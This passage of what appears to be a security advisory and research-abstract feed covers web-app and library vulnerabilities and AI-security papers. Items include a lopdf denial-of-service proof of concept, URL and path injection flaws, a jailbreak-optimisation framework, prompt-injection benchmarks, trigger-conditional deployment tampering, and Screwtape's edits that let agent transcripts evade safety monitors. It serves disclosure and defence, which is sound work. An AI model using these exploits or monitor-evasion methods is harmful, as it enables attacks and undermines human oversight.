  ```

- `poc/parent-spoof-poc.html` — a page that embeds the UI and injects fabricated
  rows cross-origin with no handshake; the UI renders them.

## Remediation

- Validate `event.origin` against the expected host origin on every inbound
  message; drop messages from other origins.
- Send outbound `postMessage` with an explicit target origin (the host origin
  established at initialize time) instead of `'*'`.
- Optionally, bind to a nonce/channel established during `ui/initialize` so only
  the negotiated host can drive the panel.

items.title: swoosh has email-derived URL path injection in Microsoft Graph endpoint
items.summary:
### Summary

`Swoosh.Adapters.MsGraph` builds its Microsoft Graph API request URL by interpolating the sender's email address directly into the URL path (`/users/{from}/sendMail`) without percent-encoding or validation. In applications that derive the `from` address from untrusted or user-influenced input (a relay, a contact form, or a "send as" feature), an attacker can inject URL-special characters into the local part of the address to escape the intended path segment and rewrite the request's path and query string. Because the rewritten request is still sent as the application's authenticated `POST` with its Microsoft Graph bearer token, the attacker can redirect it to other Graph endpoints within the token's scopes.

### Details

The flaw is in `lib/swoosh/adapters/ms_graph.ex`. `api_endpoint_url/2` constructs the Graph endpoint by interpolating the email's `from` address into the path `/users/{from}/sendMail`. The `from` value is taken verbatim from the email struct and is neither percent-encoded nor validated against the RFC 5321 character set before being placed into the URL. `deliver/2` then issues an authenticated `POST` to that constructed URL using the application's Graph bearer token.

Because the address sits as the local part of `/users/{from}/sendMail`, characters such as `/`, `?`, and `#` are not neutralized. A `/` lets the attacker append or replace additional path segments, a `?` starts an attacker-controlled query string, and `#` truncates the remainder of the intended path. The result is that the authenticated request can be steered to a different Graph endpoint or carry attacker-chosen query parameters, all under the token's existing scopes. Applications that always send with a fixed, trusted `from` address never reach the injectable path and are unaffected.

### PoC

1. Configure an application to use `Swoosh.Adapters.MsGraph` and derive the email `from` address from user-influenced input (e.g. a contact form's reply address or a "send as" field).
2. Submit a `from` address whose local part contains URL-special characters, for example one using `/`, `?`, or `#` to escape the `/users/{from}/sendMail` path segment.
3. Trigger delivery; Swoosh interpolates the address unencoded and sends the application's authenticated Graph `POST` to the attacker-rewritten path and query string.

### Impact

An attacker who can influence the sender address can redirect an application's authenticated Microsoft Graph requests to other endpoints within the bearer token's scopes and control the request's query string, turning the mail-sending path into a constrained server-side request forgery against the Graph API.

### References

* Introduction commit: https://github.com/swoosh/swoosh/commit/23bfcdab71aee4613858ba6d116bb3311b72aa58
* Patch commit: https://github.com/swoosh/swoosh/commit/e38235453e81d1727bfc8d91e69ec4cb211ccf61
* Affected adapter source: https://github.com/swoosh/swoosh/blob/master/lib/swoosh/adapters/ms_graph.ex

items.title: ClickMigrate has Path Traversal in "revision -m" argument
items.summary:
### Impact
A path traversal vulnerability in the `revision` command allowed a crafted migration name supplied via the `-m` argument to escape the intended migrations directory.

Under specific conditions, an attacker could cause the tool to create a `.sql` file in an arbitrary location writable by the user executing the command.

This issue is only exploitable if an attacker can influence the migration name passed to the `revision` command, such as through an insecure automation or CI/CD pipeline that forwards untrusted input.

### Patches
The vulnerability has been fixed in version 1.0.3 by validating and sanitizing the migration name to prevent directory traversal.

Users should upgrade to version 1.0.3 or later.

### Workarounds
Do not pass untrusted input to the `revision -m` argument.

If upgrading is not immediately possible, ensure that only trusted users or automation can invoke the `revision` command and that migration names are validated before being passed to the tool.

### References
- Fix commit: https://github.com/QueueForge/ClickMigrate/commit/6b1f2c0202630a82252b3331aa57e64327e112b6

items.title: BiShield-TEE: On the (In-)Security of Unilateral Weight Obfuscation in On-Device TEE-Shielded LLM Partition
items.summary: On-device deployment of large language models (LLMs) is increasingly adopted due to latency and privacy requirements, but exposes proprietary models to reverse engineering and intellectual property theft. Trusted Execution Environments (TEEs) provide hardware-enforced isolation for on-device inference, yet most TEE-based parameter obfuscation relies on unilateral matrix transformations that obfuscate only output side. We identify a vulnerability in this design, termed the \emph{Solution Determinacy Property (SDP)}: the obfuscation secret is uniquely determined, exposing the structure of the true key and enabling attackers to break the protection. Under our attacks, representative methods \textsc{GroupCover} and \textsc{ArrowCloak} are reduced to negligible protection, with attack accuracy reaching over $2.4\times$ the full-shielding black-box baseline and recovering near-complete model functionality.To address this vulnerability, we propose \textsc{BiShield-TEE}, a bilateral framework that induces \emph{Ambiguous Solutions} through joint obfuscation of input and output dimensions, hiding the true key among many equally valid candidates. Experiments across diverse models and datasets show that \textsc{BiShield-TEE} confines attack accuracy to the full-shielding black-box baseline, while achieving higher inference efficiency than prior methods on real hardware.Our code is available at https://github.com/laduiw/BiShield-TEE.

items.title: What Survives Self-Evolution: Provenance Marks in Copied Agent Harnesses
items.summary: Agent harnesses, the prompt and tool code around a base model, leak. Claude Code's 512,000 lines were mirrored within hours of a packaging error. A plagiarist can pass a leaked harness through a published self-evolver and ship the result as its own. We define this as a covert rewriting attack. No one targets a provenance mark, yet a large language model (LLM) proposer rewrites the file that carries it and a score keeps the better rewrites. We give the first measurement of marks under this attack, with three evolvers, five proposers and two environments. Published marks fail. KGW in the prompt survives GEPA's rewrites in 0 of 12 copies, AgentMark as released in 5 of 12. The proposer's habits decide survival, by two orders of magnitude across models, and selection protects a mark only when each decision sees enough games. We then build a mark for this attack. Its key is the order of near-tied entries of a table of where objects are found, built from public games, so deleting the table costs success, rewrites that keep its rows keep the order, and a customer reads the key from the agent's actions alone. On held-out games it is detected in 62 of 76 copies whose lineage rewrote its file. A scheme-aware plagiarist reshuffles the ties at no measurable cost, and a plagiarist who asks the proposer for more general code removes the key in 75-100% of rewrites.

items.title: Evaluating and Improving Static Application Security Testing Tools for Rust
items.summary: Rust has become a popular systems programming language in recent years because of its strong guarantees on memory and concurrency safety. Many types of system software have been re-implemented in Rust. However, Rust programs can still suffer from common memory and concurrency vulnerabilities due to unsafe code and misunderstandings of its complex mechanisms. To mitigate such vulnerabilities, developers often rely on static application security testing (SAST) tools. However, the effectiveness of existing Rust SAST tools on real-world vulnerabilities remains underexplored. In this paper, we first conduct an empirical evaluation of mainstream Rust SAST tools using security vulnerabilities identified in real-world Rust applications. We systematically assess their effectiveness, uncover common weaknesses, and analyze the root causes behind them. Motivated by the study, we propose TRUST, a large language model (LLM)-assisted automated testing framework. TRUST automatically analyzes the official Rust reference to derive and implement semantics-preserving transformations. It leverages these transformations to generate mutant programs for evaluating Rust SAST tools and uncovering potential faults within them. Overall, TRUST has revealed 46 faults across six popular SAST tools, 17 of which have been confirmed. In addition, our study yields ten empirical findings and four practical lessons that provide actionable guidance for developing more effective, robust, and maintainable Rust SAST tools.

items.title: QuasiLeak-Bench: Evaluating LLM-Based Privacy Detectors on Policy-Conditioned Quasi-Evidence Group Recovery
items.summary: Natural language messages often contain quasi-identifiers that are weak in isolation but can jointly reveal an individual's private attributes. We call such a jointly revealing set of cues a quasi-evidence group. Existing privacy benchmarks focus on explicit identifiers, attribute inference, or task-driven disclosures, leaving inference from quasi-evidence groups largely unmeasured. In practice, whether exposing such a quasi-evidence group violates privacy also depends on sender-specified disclosure policies. We introduce QuasiLeak-Bench, a benchmark for policy-conditioned quasi-evidence group recovery, which evaluates whether detectors recover complete quasi-evidence groups and flag the disclosures the given policy prohibits. To obtain reliable ground truth at scale, a reverse-construction pipeline first selects weak quasi-identifiers, composes them into quasi-evidence groups verified to jointly reveal a target attribute, and generates documents around this evidence, followed by automated quality control. Experiments show that existing privacy detectors transfer poorly to QuasiLeak-Bench, and locally deployable LLM-based detectors fall far behind proprietary models, mainly because they miss most quasi-evidence groups altogether. However, a 4B model fine-tuned on our training split surpasses the strongest prompted model on held-out documents, showing that the task is learnable.

items.title: Combining LLM and Dynamic Analysis for Universal Testing of Static Application Security Testing Tools
items.summary: Static application security testing (SAST) tools help detect potential software vulnerabilities, but they themselves contain faults undermining reliability and usability. Automated testing can address these issues, yet current techniques suffer from limited program transformation diversity and lack mechanisms to verify generated variants, leading to reduced fault detection and high manual effort. We present LLM4SAST, the first universal framework detecting faults in SAST tools using large language models and dynamic feedback. Our key insight is leveraging LLMs to understand and transform code in diverse programming languages. We design novel metamorphic relations with transformations to guide variant generation, using an LLM to produce multi-language variants that satisfy these relations. To reduce erroneous variants and identify unique faults, we propose two heuristics: dynamic-feedback-driven selection and program-differencing-based clustering. For each metamorphic relation, a report-centric test oracle detects variants that fail tests and identifies underlying faults by differentially analyzing SAST reports of the seed program and its variants. LLM4SAST identified 66 unique faults across six SAST tools, with 32 confirmed or fixed after being reported to developers, demonstrating effectiveness. The proposed heuristics eliminate 47.8% of false positives, and LLM4SAST detects 3.4 times more faults while requiring only 39.8% of the variants compared to existing approaches.

items.title: Stronger Judges Do Not See More: Deployment-Integrity Blindness in LLM Evaluation
items.summary: LLM-agent evaluation reports behavioral scores but leaves the identity of the deployed runtime stack unreported. A tampered deployment that preserves evaluated outputs passes every output-only evaluator. We introduce DIB-Bench, a benchmark that measures this deployment-integrity blindness across 7,560 scored examples, six tamper types, and an evaluator ladder from regex scorers through LLM judges to GPT-5-nano. Stronger evaluators accept more tampered outputs: mean acceptance rises from 88.6% (rule-based) to 94.1% (GPT-5-nano), and a trigger-conditional tamper invisible on the evaluation suite produces 48-100% harmful outputs, rising with model capability. A PAC-style bound shows that tampers with zero output shift are undetectable from outputs at any sample size; a manifest-hash identity channel detects them with zero samples. Behavioral fingerprinting identifies the model component above chance (76.7%) but covers one of six stack components. We also propose a graded deployment-identity descriptor for evaluation reports.

items.title: PAGE404: Breaking GPU Isolation Through Hardware-assisted Page Migration
items.summary: NVIDIA's Grace Hopper (GH200) superchip represents a new generation of heterogeneous computing, tightly integrating a 72-core Arm-based CPU with a Hopper GPU on a single module via a high-bandwidth, cache-coherent interconnect. By eliminating the conventional PCIe bottleneck for CPU-GPU data movement, this design establishes a unified memory domain that scales to the capacities demanded by generative AI and high-performance computing (HPC) workloads. The architecture also introduces hardware-assisted page migration: driven by access counters, the system dynamically promotes frequently accessed pages from host CPU memory to GPU DRAM to improve memory locality. We study the security of this emerging architecture against new side- and covert-channel attacks targeting its page migration support. We analyze counter-driven migration across both the hardware mechanisms and the UVM driver's interrupt-handling pipeline, and identify two side-channel vulnerabilities: one rooted in the shared structure of access counters, and the other in the driver's response to migration interrupts. We further show that both channels are exploitable across Multi-Instance GPU (MIG) partitions, a feature intended to provide strong, hardware-enforced isolation between co-located tenants. Using proof-of-concept attacks, we build covert channels that reach roughly 8,500 bits per second through eviction-based signaling and 8,100 bits per second through migration-delay-based signaling across MIG instances. The interrupt-based channel also fingerprints inference workloads across distinct large language models (LLMs) and CPU SPEC2017 benchmarks, and estimates the prompt length processed during LLM inference with high accuracy. These results expose a security gap in hardware-managed heterogeneous memory systems and call into question the isolation guarantees of current MIG-enabled multi-tenant GPU deployments.

items.title: Screwtape: Adversarial Transcript Editing for Monitor Red-Teaming
items.summary: We present Screwtape, a pipeline that converts real agent transcripts into attacks that evade action-only monitors. An LLM attacker edits a transcript so that the agent causes a specified harm, such as leaking an API key or spawning an unmonitored agent. The edited actions are never executed, so we use an LLM verifier to reject attacks that are inconsistent with the original transcript or below a severity bar. The attacker revises the edit until the monitor no longer flags it. We applied Screwtape to 94 Claude Code and Codex transcripts from Redwood Research staff, optimizing against our own monitors. Across 252 runs, it produced 35 attacks that passed the verifier and evaded these monitors. Six of them, confirmed valid by human review, also evaded a held-out monitor provided by a frontier developer. We therefore demonstrate that a red-teamer without access to a developer's infrastructure can find confirmed failures of the developer's monitor. We expect to find more attacks when the pipeline runs inside the developer's infrastructure, with frontier attacker models that lack refusal safeguards and direct optimization against the production monitor. Developers can use these attacks to fix monitor blind spots, and evaluators can use them as counterexamples to safety claims about the monitor.

items.title: From Detection to Decision: Calibration and Deferral for Prompt-Injection Detection
items.summary: Prompt-injection defenses are commonly evaluated as binary detectors, although deployed LLM applications must make operational decisions about whether to allow, block, or escalate potentially malicious inputs. Recent probabilistic decision models aim to support such decisions through calibrated confidence estimates, but their reliability under distribution shift remains uncertain. We evaluate a native probabilistic decision model (Jev), two Llama Prompt Guard 2 classifiers (22M and 86M), and an LLM-based judge on 47,611 held-out examples spanning direct and indirect prompt injections, hard-benign inputs, obfuscation, and distribution shift. Using separate development and calibration splits, we assess detection performance, probability calibration, and allow-block-defer policies under a frozen evaluation protocol. The LLM judge achieves the highest overall discrimination (AUROC 0.897), followed by Jev (0.871), Prompt Guard 2 86M (0.757), and Prompt Guard 2 22M (0.714). However, Jev's native probabilities do not consistently outperform post-hoc calibrated classifier scores, and temperature scaling improves calibration without improving discrimination. At an empirical false-negative-rate target of 1%, all evaluated gate-reviewer systems require more than 91.8% escalation and incur substantial false-positive rates. These findings demonstrate that probabilistic outputs alone do not establish reliable security decisions under distribution shift. Effective LLM security systems must jointly evaluate detection, calibration, reviewer behavior, and operational decision policies.

items.title: INFUSE: A Unified Surface Benchmark for Indirect Prompt Injection in Agentic Systems
items.summary: LLM-based agents increasingly execute long-horizon, end-to-end workflows involving shell commands, code modification, dependency installation, and interaction with remote services. This growing autonomy expands their exposure to indirect prompt injection (IPI), where adversarial instructions embedded in external content are interpreted as legitimate task directives. Existing evaluations, however, often focus on isolated malicious strings, single-step tool calls, or narrowly scoped agent configurations. We introduce INFUSE, an end-to-end benchmark for evaluating IPI throughout the lifecycle of long-horizon agent workflows. INFUSE comprises 40 realistic tasks and a structured taxonomy of 56 attack scenarios spanning five threat categories. Attacks are injected through realistic interaction surfaces encountered during task execution, extending evaluation beyond attacks placed only in initial prompts or isolated tool interactions. We evaluate 19 LLMs from the GPT, Claude, Gemini, Llama, Gemma, and Qwen families, producing 41,824 adversarial trajectories (26,220 without defenses) and 720 benign reference runs. Across the benchmark, mean attack success reaches 19.6% under LLM-based evaluation and 15.4% under heuristic verification, with per-model ASR-L ranging from 3.2% to 41.9%. Existing guard models provide limited protection, while prompt-level instructional hardening reduces mean attack success from 58.2% to 14.3%, revealing substantial but model-dependent security-utility trade-offs. Our code is available at https://github.com/judydnguyen/infuse.

items.title: From Training to Escalation: Forensic Analysis and Local Recreation of RL/RLHF-Induced Privilege Escalation in AI Agents (CVE-2026-65616)
items.summary: Mid-2026 reporting on autonomous AI evaluation incidents claimed that frontier large language model (LLM) agents escaped server containment through emergent coordination and cloud infrastructure attacks. This paper contextualizes those claims through forensic analysis and containerized recreation of both the Highly Persistent Internal Model (HPIM) training-case conditions and the Phase One privilege escalation targeting internal package repositories during OpenAI's ExploitGym evaluations. We recreate the configuration of the OpenAI-provided training example and reproduce the cryptographic verification bypass (CVE-2026-65616) in isolated repository servers, where misconfigured systems enabled token forgery and privilege escalation through basic HTTP requests, Python, and JavaScript. Crucially, the training-example conditions and the Phase One (and later) misconfigurations share the same exploitable patterns. Our analysis explains how Zero Trust Architecture principles neutralize this shared attack vector. Contemporary AI risks derive directly from training and deployment conditions in ambivalent learning environments lacking adequate containment measures.

items.title: P2Patch: Exploit-Guided Vulnerability Repair
items.summary: Large language models are increasingly deployed as autonomous agents for automated program repair, patching software vulnerabilities through multi-step reasoning and tool use. Yet these systems typically validate a patch against the same evidence used to construct it -- a static alert, sanitizer trace, published exploit, or test suite. A patch that blocks that one piece of evidence can therefore look successful while remaining vulnerable to the same vulnerability with some variation. We present P2Patch, a generative adversarial repair system that treats each patch as a new attack target. Starting from a normalized vulnerability finding, an exploitation agent constructs a reproducing proof of vulnerability (PoV), a patching agent repairs the program, and the exploitation agent then attacks the patched program for a distinct same-vulnerability exploit. Every successful exploit becomes a permanent repair requirement, and the final patch must block all PoVs accumulated during the patching process, with construction-time PoVs kept strictly separate from held-out evaluation oracles. Across 101 C/C++ and Java CVE subjects, this adversarial loop surfaces a distinct confirmed exploit in 41% of runs after the patch has already blocked its original construction-time PoV. Against single-pass repair from the same finding using Claude Code, P2Patch raises held-out fix-closed coverage from 78.1% to 84.7% and beyond-upstream coverage from 42.1% to 62.5%. Under the same held-out oracles, it also certifies more attack paths as blocked than recent state-of-the-art agentic repair systems on overlapping subjects. These results show that adversarial testing and independent security oracles expose repair gaps that one-shot validation misses.

items.title: Diagnose Before You Refine: Multi-Dimensional Judge Feedback for Query-Efficient Jailbreak Attacks
items.summary: Automated jailbreak attacks rely on evaluation feedback to optimize adversarial prompts, but existing methods often lack fine-grained diagnostic information. We propose Jev-Guided Strategy Bandit (JSB), a query-based jailbreak framework that leverages multi-dimensional probabilistic feedback to guide prompt optimization. JSB combines continuous jailbreak scoring with targeted refinement, strategy switching, and best-state reseeding to balance exploration and refinement. We evaluate JSB on two harmful request datasets across five open-source and three closed-source LLMs. Under a budget of only 10 target-model queries, JSB achieves an average HarmBench attack success rate of 89.8\% across ten open-source settings, consistently outperforming existing automated jailbreak attacks. Further analyses demonstrate its effectiveness under varying query budgets and attacker models. Defense experiments also reveal limitations in existing filtering mechanisms and highlight the potential of Jev-based output filtering.

items.title: lopdf has a stack overflow via deeply nested PDF objects
items.summary:
`lopdf::Document::load_mem` (and the other `load*` entry points) parses nested PDF arrays and dictionaries with unbounded recursion. A small crafted PDF whose Catalog contains a deeply nested array (`/X [[[ … ]]]`, on the order of 10,000 levels) exhausts the call stack and aborts the process with `SIGABRT`.

Because this is a stack-overflow abort rather than a `panic!`, it cannot be caught with `catch_unwind`: any service that parses untrusted PDF input with lopdf can be crashed by a ~21 KB file, resulting in a denial of service.

Confirmed on lopdf 0.41.0 and earlier; fixed in 0.42.0. Default configuration, no features changed.

## Proof of concept

```rust
fn main() {
    let bytes = std::fs::read("poc.pdf").unwrap(); // ~10,380-deep nested array in the Catalog
    let _ = lopdf::Document::load_mem(&bytes);     // stack overflow -> SIGABRT
}
```

An equivalent PoC is a minimal PDF whose Catalog `/X` value is `"[" * 10380 + "]" * 10380`.

## Suggested fix

Enforce a maximum object-nesting depth in the parser and return an `Err` instead of recursing without bound.

items.title: My Credentials, Please: Detecting Filesystem Capability Laundering in MCP Servers at Scale
items.summary: The Model Context Protocol (MCP) standardizes how AI agents invoke external tools. MCP servers expose tools through a declared contract consisting of a name, description, and argument schema. In typical local deployments, client-side approval of a tool call grants the underlying server process broad host filesystem permissions rather than restricting it to the declared operation. We study the resulting vulnerability class, filesystem capability laundering, where attacker-steered arguments cause a tool to access sensitive host files outside its declared contract and deployment scope. We analyze this capability gap across three layers: server-category screening (L1), per-tool contract analysis (L2), and bypassable path-validation checks (L3). We design MCP-FSD to catalog MCP servers, infer least-privilege boundaries per tool, plant credential fixtures outside those boundaries, and evaluate exploitability and sandbox containment via paired dynamic execution. Across 21,097 MCP servers from nine registries, 787 of 4,806 triaged servers (16.4%) exhibit filesystem capabilities despite non-filesystem functional classifications. Dynamic three-case validation confirms 150 vulnerable instances under tested sandbox policies. Coordinated disclosure yielded 13 security advisories, including two CVEs in Anthropic's Git MCP Server.

items.title: Subgraph Counting with Local Node Differential Privacy
items.summary: We study the problem of approximately counting subgraphs under local node differential privacy (LNDP), a recently introduced model that enforces strong privacy guarantees in analyses of distributed social networks. We design a noninteractive $(\varepsilon,0)$-LNDP algorithm that, given any public $k$-node template graph $H$, counts occurrences of $H$ in a sensitive undirected $n$-node graph with additive error $O(n^{k-\frac{1}{2}}/\varepsilon^{k-1})$, for any constant $k$. We complement this algorithm with a lower bound showing that every noninteractive $(\varepsilon,δ)$-LNDP algorithm for counting copies of any $k$-node template graph with maximum degree greater than $1$ must have error $Ω(n^{k - \frac{1}{2}})$. Thus, our algorithm achieves optimal error for counting constant-size subgraphs, up to $\mathrm{poly}(1/\varepsilon)$ factors. Our results substantially expand the types of network statistics known to be approximable under LNDP: prior work considered only functions of the degree distribution. In addition, our lower bound yields the first known $\mathrm{poly}(n)$ gap between central and local node differential privacy when accuracy is required for all input graphs. Previous separations either only involved $\mathrm{poly}(1/\varepsilon)$ factors or only applied to promise problems.

items.title: Language Is a Security Surface for Agent Guards
items.summary: Step-level guards decide, before each tool call, whether an agent's next action is safe given the user's request and the trajectory so far. Users write those requests in many languages, while guard prompts and the benchmarks on which purpose-built guards are trained and evaluated are English. We ask whether a guard's verdict depends on the language of the request. We build LinguaGuardBench from the 1,220 labelled steps of TS-Bench AgentDojo-Traj: we translate only the user instruction into German, French, Turkish, Swahili and Amharic, and keep every tool call, observation and label byte-identical, so any change in a verdict is attributable to language alone. Six English rewordings and a whitespace placebo serve as controls, and managed guards are run three times to measure their noise. Across 19 guards, from frontier APIs to 4B open models and four purpose-built agent guards, most open, small and purpose-built guards change verdicts under translation beyond their own noise floor, and the effect grows with the rarity of the language: among the nine guards below 13B parameters, the mean placebo-adjusted flip rate rises from +1.5 pp on French to +4.4 pp on Amharic. Purpose-built guards are the most sensitive. The direction of the damage tends to follow guard size: open guards of 12-30B parameters block more benign steps (up to +5.0 pp false positives), and every significant loss of recall is in a guard below 10B (up to -7.4 pp). Frontier guards shift by at most about one point; the strongest, Gemini 3.8 Flash, returns identical verdicts with and without the request. The damage is concentrated in a few instructions and, in a post-hoc analysis, falls on steps where the agent's reasoning restates the English request, consistent with guards reacting to inconsistency between channels. English paraphrase moves every guard less than translation does. We release the benchmark and all 489k verdicts.

items.title: Shortcut Sensitivity in Agent-Safety Evaluations
items.summary: AI agents take actions through tools. Some actions are sensitive, so guards that supervise them must themselves be evaluated reliably. Yet the data used to evaluate a guard can include cues that make labels predictable without measuring the intended safety construct, and those cues can also influence guard decisions. We introduce a three-level shortcut-auditing framework and audit completed LinuxArena trajectories and two TS-Bench-derived step datasets. We distinguish label predictability, observational guard association, and paired decision sensitivity. In LinuxArena, shorter average shell commands strongly predict trajectory labels. In AgentDojo-Traj, exact-tool lookup falls from F_1=.901 with mixed-domain folds to .495 under domain holdout. In AgentHarm-Traj, released TS-Guard F_1 falls from .902 under row weighting to .719 with equal interaction weighting, while balanced accuracy rises. We then test the strongest safe-row marker association in a seven-configuration screen on a frozen 64-step AgentDojo-Traj cohort using repeated, interleaved Haiku calls. Rewriting the <INFORMATION> marker lowers blocking by 8.33 percentage points, while opaque tool aliases raise it by 11.46 points. All unsafe calls remain blocked; the changes concern false positives against inherited labels. Both effects remain nonzero after subtracting the formatting-placebo effect, with exploratory 95% ranges excluding zero. The same edits also change measured accuracy against inherited labels. This provides direct evidence that benchmark representation can materially change a guard's decisions and measured evaluation performance. The Haiku-sized effects do not reproduce in Luna or deterministic Q8 TS-Guard. We recommend domain group holdouts, evaluation-unit metrics, and placebo-controlled paired interventions.

items.title: MAppPrint: Robust and Real-time Mobile App Fingerprinting via Traffic Behavior Correlation Graphs
items.summary: Mobile apps have become ubiquitous in daily life. Despite communication encryption, app fingerprinting (AF) attacks can still enable adversaries to infer the apps in use by analyzing patterns of encrypted network traffic. However, existing AF attacks suffer from three critical limitations that hinder their practical effectiveness: (i) the inability to capture app-specific traffic dependencies, rendering traffic fingerprints fragile under dynamic networking conditions; (ii) the neglect of latency and throughput considerations, resulting in inefficient real-time user tracking; and (iii) the incapacity to handle mixed traffic generated by multi-app concurrency. In this paper, we propose MAppPrint, a robust and real-time app fingerprinting framework. MAppPrint introduces a behavior-level traffic fingerprint, i.e., Traffic Behavior Correlation Graph (TBCG), which models app traffic by capturing unit traffic behaviors and their correlations, thereby providing reliable app fingerprints. To enable real-time fingerprinting, MAppPrint incorporates a fingerprint compression algorithm that transforms each TBCG into a compact graph by selectively aggregating redundant information. Furthermore, MAppPrint employs an unsupervised decomposition strategy to disentangle mixed traffic generated by multi-app concurrency, enabling unified identification of both single-app and multi-app traffic. items.title: Encoded but Exposed: Language Embeddings can Reveal More Than They Should in Recommender Systems
items.summary: Language embeddings are increasingly used in recommenders to represent item content, but their privacy risks remain poorly understood. items.title: Federated Art Chase: Privacy Leakage and Data Poisoning in Federated Fine-Tuning
items.summary: Federated learning (FL) is increasingly used to adapt a pretrained, centrally fine-tuned model to data that remain on user devices, beyond training a model from scratch. In this report, prepared for the 4th Federated Machine Learning International Summer School, we study the privacy and integrity of this approach with a reproducible pipeline. An ImageNet-pretrained MobileNetV4-Conv-Small model is fine-tuned centrally on ten Quick, Draw! classes (97.50% test accuracy) and then adapted with head-only FedAvg over ten non-IID clients, which raises client training accuracy from 90.34% to 91.49% while preserving global accuracy. We evaluate four adversarial scenarios. First, from a single one-step client update, an honest-but-curious server recovers the complete private label set, but its reconstructions follow class prototypes rather than the private drawings (mean SSIM 0.130). Second, from a one-round FedAvg aggregate, label-count recovery falls from 87.5% with one client to 75.0% with five and ten clients, below the 80.0% of an uninformed uniform guess. Third, under FedAvg, a backdoor injected by 30%, 50%, and 100% of the clients reaches an attack success rate (ASR) of 21.9%, 31.3%, and 54.7% at a cost of at most 0.8 percentage points of clean accuracy, whereas label flipping is effective only when most of the source-class data are relabeled. Fourth, FLTrust with a root set retained from centralized fine-tuning lowers the backdoor ASR to 1.8% and 4.0% at 30% and 50% malicious clients and the label-flipping ASR from 12.6% to 0.8% without measurable clean-accuracy loss, but provides no protection when every client is malicious. The report closes with a live session in which participants draw, fine-tune, and poison the model through Indigma's FedMaestro orchestrator. Code and executed notebooks, runnable on Google Colab, are at https://github.com/Indigma-Innovations/fl-summer-school.
